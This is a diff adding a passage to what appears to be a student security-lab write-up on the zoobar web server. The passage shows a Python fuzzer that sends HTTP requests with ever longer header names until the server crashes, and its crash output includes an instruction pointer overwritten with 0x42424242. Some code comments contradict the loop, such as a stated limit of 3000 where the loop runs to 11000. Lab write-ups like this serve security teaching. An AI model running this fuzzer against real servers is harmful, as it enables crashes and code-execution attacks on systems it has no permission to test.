@@ -50,4 +50,44 @@ In the 'dir_join' function the program also uses 'strcat', which does not check 
 
 ------
 
+For the second vulnerability we chose to exploit was how the zoobar HTTP server handles HTTP requests headers. If we as an attacker create an arbitrary header that exceeds the 'envvar' variable 512 bytes, we successfully corrupt the memory of the zoobar process.
+
+    # Fuzzed HTTP Requests trying to find
+    # the maximum size that the server
+    # can handle
+
+    import sys, socket, time
+    
+    # Use in the form "python httpfuzz.py host port"
+
+    host = sys.argv[1] # Recieve IP from user
+    port = int(sys.argv[2]) # Recieve Port from user
+
+    length = 100 # Initial length of 100 A's
+
+    while (length < 11000): # Stop once we've tried up to 3000 length
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
+        client.connect((host, port)) # Connect to user supplied port and IP address
+
+        command = "GET / HTTP/1.1\r\nHost: " + host + "HTTP_" + length * "B" + ": foo" + "\r\nConnection: Close\r\n\r\n"
+        client.send(command) # Send the user command with a variable length name
+        data = client.recv(1024) # Recieve Reply
+        client.close() # Close the Connection
+        time.sleep(2)
+        print "Length Sent: " + str(length) # Output length of the request
+        length += 100 # Try again with an increased length
+
+The memory corruption happens after we have sent little over 500 bytes:
+
+    Length Sent: 500
+    Traceback (most recent call last):
+      File "fuzzer.py", line 20, in <module>
+        data = client.recv(1024) # Recieve Reply
+    socket.error: [Errno 54] Connection reset by peer
+
+If we look at the status of dmesg, we can see the following:
+
+    [ 9611.046876] zookfs-exstack[3471]: segfault at 42424242 ip 42424242 sp bfffde00 error 14
+
+------
 Word about stack canaries here 
